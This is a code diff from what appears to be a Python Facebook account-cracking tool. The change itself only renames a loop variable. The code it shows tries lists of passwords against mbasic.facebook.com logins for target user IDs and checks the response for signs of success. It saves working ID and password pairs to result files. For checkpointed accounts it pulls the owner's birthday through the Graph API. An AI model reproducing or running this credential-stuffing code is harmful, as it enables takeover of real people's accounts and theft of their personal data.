@@ -500,14 +500,14 @@ def manual():
 		except OSError:
 			pass
 		try:
-			for asu in pw.split(","):
-				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
+			for ibnustaganteng in pw.split(","):
+				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ibnustaganteng, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '       ')
-					ok.append(uid+'|'+asu)
+					print('\r  \033[0;92m* --> ' +uid+ '|' + ibnustaganteng + '       ')
+					ok.append(uid+'|'+ibnustaganteng)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
+					save.write('  * --> '+str(uid)+'|'+str(ibnustaganteng)+'\n')
 					save.close()
 					break
 					continue
@@ -517,19 +517,19 @@ def manual():
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
-						print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '|' + ttl)
-						cp.append(uid+'|'+asu+'|'+ttl)
+						print('\r  \033[0;93m* --> ' +uid+ '|' + ibnustaganteng + '|' + ttl)
+						cp.append(uid+'|'+ibnustaganteng+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
+						save.write('  * --> '+str(uid)+'|'+str(ibnustaganteng)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '       ')
-					cp.append(uid+'|'+asu)
+					print('\r  \033[0;93m* --> ' +uid+ '|' + ibnustaganteng + '       ')
+					cp.append(uid+'|'+ibnustaganteng)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
+					save.write('  * --> '+str(uid)+'|'+str(ibnustaganteng)+'\n')
 					save.close()
 					break
 					continue
